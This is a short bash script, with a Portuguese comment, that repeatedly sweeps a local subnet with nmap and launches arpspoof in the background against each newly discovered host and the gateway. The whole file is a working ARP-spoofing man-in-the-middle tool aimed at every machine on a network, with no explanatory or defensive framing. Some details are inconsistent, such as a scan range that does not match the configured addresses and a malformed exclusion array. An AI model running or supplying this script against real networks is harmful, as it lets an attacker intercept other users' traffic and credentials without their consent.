#!/bin/bash

myip="192.168.0.105"
gateway="192.168.0.1"
hosts=($gateway,$myip)

echo -e "$myip\n$gateway" > hosts_exclude.txt

while :; do
	nmap 192.168.100.0/24 -n -v -sn --open --excludefile hosts_exclude.txt | grep report | cut -d ' ' -f 5 > found.txt
	# awk '!seen[$0]++' found_temp.txt > found.txt # sem repetidos
	for host in $(cat found.txt); do
		if [[ ! " ${hosts[*]} " =~ " ${host} " ]]; then
			echo spoofing $host
			arpspoof -i eth0 -t $host -r $gateway 2> /dev/null > /dev/null &
			hosts[${#hosts[@]}]="$host"
			sleep 1
		fi
	done
done
